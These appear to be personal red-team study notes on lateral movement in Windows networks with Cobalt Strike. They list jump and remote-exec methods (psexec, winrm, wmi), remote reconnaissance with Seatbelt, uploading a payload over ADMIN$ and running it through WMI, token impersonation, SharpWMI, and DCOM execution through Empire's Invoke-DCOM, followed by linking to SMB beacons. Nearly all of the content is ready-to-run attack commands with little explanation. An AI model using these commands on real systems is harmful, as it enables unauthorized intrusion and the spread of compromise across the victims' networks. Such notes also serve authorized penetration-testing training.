# Lateral Movement Notes

## Jump

The first and most convenient is to use the built-in jump command - the syntax is jump [method] [target] [listener].  Type jump to see a list of methods.  

```
jump
```

list of them 
1. psexec
2. psexec64
3. psexec_psh
4. winrm
5. winrm64

## Remote-Exec

Built-in tool with CS
```
remote-exec
```
Options
1. psexec
2. winrm
3. wmi

Can als0 run SeatBelt remotely to check the systems before jumping to them

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
```

## Windows Remote management

winrm or winrm64

```
jump winrm64 <domain> smb
```

## Psexec

psexec or psexec64, or psexec_psh which doesn't put a binary but instead executes a powershell oneliner
```
jump psexec64 <domain> smb
jump psexec_psh <domain> smb
```


## WMI

upload a payload to the target system and use WMI to execute it
```
cd \\OtherComputer\ADMIN$
upload C:\payloads\smb_exe64.exe
remote-exec wmi <OtherComputer> C:\Windows\smb_x64.exe
```
Now connect to it
```
link <OtherComputer> TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

## CoInitializeSecurity

If this fails
```
make_token DOMAIN\User <pass>
remote-exec wmi <OtherComputer> C:\Windows\smb_x64.exe
```

Try executing from a different process
```
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=<OtherComputer> command="C:\Windows\smb_x64.exe"
```

## DCOM

Utilizing [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)

```
powershell-import C:\Tools\Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName <OtherComputer> -Method MMC20.Application -Command C:\Windows\smb_x64.exe
link <OtherComputer> TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```
